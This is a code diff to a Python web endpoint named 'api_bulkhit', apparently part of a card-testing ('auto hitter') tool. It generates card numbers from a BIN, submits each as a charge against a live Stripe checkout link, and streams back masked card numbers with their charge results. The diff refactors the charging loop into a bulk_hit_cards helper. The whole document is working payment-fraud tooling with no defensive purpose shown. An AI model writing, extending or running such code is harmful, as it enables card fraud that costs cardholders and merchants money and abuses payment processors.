@@ -7230,12 +7230,10 @@ def api_bulkhit():
     def generate():
         from modules.auto_hitter import (
             extract_checkout_url, parse_gen_input, generate_cards_from_bin,
-            parse_cards as ah_parse_cards, charge_card,
-            get_currency_symbol as ah_currency_symbol
+            get_currency_symbol as ah_currency_symbol, bulk_hit_cards
         )
         from modules.stripe_tls import get_checkout_info as tls_checkout_info
 
-        # ── Validate inputs ─────────────────────────────────────────────────
         checkout_url = extract_checkout_url(url)
         if not checkout_url:
             yield f"data: {_json.dumps({'type':'error','message':'Invalid Stripe checkout URL. Use buy.stripe.com or checkout.stripe.com links.'})}\n\n"
@@ -7248,13 +7246,11 @@ def api_bulkhit():
 
         prefix, mm, yy, cvv_pattern = gen_result
         card_lines = generate_cards_from_bin(prefix, mm, yy, cvv_pattern, count)
-        cards = ah_parse_cards("\n".join(card_lines))
 
-        if not cards:
+        if not card_lines:
             yield f"data: {_json.dumps({'type':'error','message':'Failed to generate cards from BIN.'})}\n\n"
             return
 
-        # ── Fetch checkout info synchronously first ───────────────────────
         loop = asyncio.new_event_loop()
         try:
             checkout_data = loop.run_until_complete(tls_checkout_info(checkout_url, None))
@@ -7268,35 +7264,20 @@ def api_bulkhit():
             yield f"data: {_json.dumps({'type':'error','message':'Could not parse checkout URL. Make sure it is a valid active Stripe link.'})}\n\n"
             return
 
-        merchant = str(checkout_data.get('merchant') or 'Unknown')[:40]
-        price    = checkout_data.get('price')
-        currency = checkout_data.get('currency', 'USD')
-        sym      = ah_currency_symbol(currency)
+        merchant  = str(checkout_data.get('merchant') or 'Unknown')[:40]
+        price     = checkout_data.get('price')
+        currency  = checkout_data.get('currency', 'USD')
+        sym       = ah_currency_symbol(currency)
         price_str = f"{sym}{price:.2f}" if price else 'N/A'
         checkout_data['email'] = 'checkout@gmail.com'
 
-        yield f"data: {_json.dumps({'type':'init','merchant':merchant,'price':price_str,'currency':currency,'count':len(cards)})}\n\n"
+        yield f"data: {_json.dumps({'type':'init','merchant':merchant,'price':price_str,'currency':currency,'count':len(card_lines)})}\n\n"
 
-        # ── True concurrent streaming via thread + queue ──────────────────
-        # Each card result is put on the queue as soon as it completes.
-        # The sync generator reads from the queue and yields SSE events immediately.
         result_queue = _queue.Queue()
 
         async def _hit_all_streaming():
-            async def _one(card):
-                try:
-                    res = await charge_card(card, checkout_data, None, None)
-                except Exception as ex:
-                    res = {'status': 'ERROR', 'response': str(ex)[:60]}
-                return card, res
-
-            tasks = [_one(c) for c in cards]
-            for coro in asyncio.as_completed(tasks):
-                try:
-                    card, result = await coro
-                    result_queue.put(('result', card, result))
-                except Exception as ex:
-                    result_queue.put(('result', None, {'status': 'ERROR', 'response': str(ex)[:60]}))
+            async for raw_str, result in bulk_hit_cards(card_lines, checkout_data, None, None):
+                result_queue.put(('result', raw_str, result))
             result_queue.put(('done', None, None))
 
         def _run_loop():
@@ -7310,7 +7291,6 @@ def api_bulkhit():
         t = threading.Thread(target=_run_loop, daemon=True)
         t.start()
 
-        # Read results from queue and stream as SSE events
         idx = 0
         while True:
             item = result_queue.get()
@@ -7324,17 +7304,16 @@ def api_bulkhit():
                 yield f"data: {_json.dumps({'type':'error','message': item[2]})}\n\n"
                 break
 
-            # kind == 'result'
-            card, result = item[1], item[2]
-            if card is None:
-                idx += 1
-                continue
+            raw_str, result = item[1], item[2]
+            parts   = raw_str.split('|') if raw_str else []
+            cc      = parts[0] if len(parts) > 0 else ''
+            month   = parts[1] if len(parts) > 1 else ''
+            year    = parts[2] if len(parts) > 2 else ''
+            masked  = f"{cc[:6]}****{cc[-4:]}|{month}|{year}"
+            status  = result.get('status', 'ERROR')
+            resp    = str(result.get('response', ''))[:80]
 
-            status       = result.get('status', 'ERROR')
-            card_str     = f"{card['cc'][:6]}****{card['cc'][-4:]}|{card['month']}|{card['year']}"
-            response_txt = str(result.get('response', ''))[:80]
-
-            yield f"data: {_json.dumps({'type':'result','idx':idx,'card':card_str,'status':status,'response':response_txt})}\n\n"
+            yield f"data: {_json.dumps({'type':'result','idx':idx,'card':masked,'status':status,'response':resp})}\n\n"
             idx += 1
 
         t.join(timeout=5)
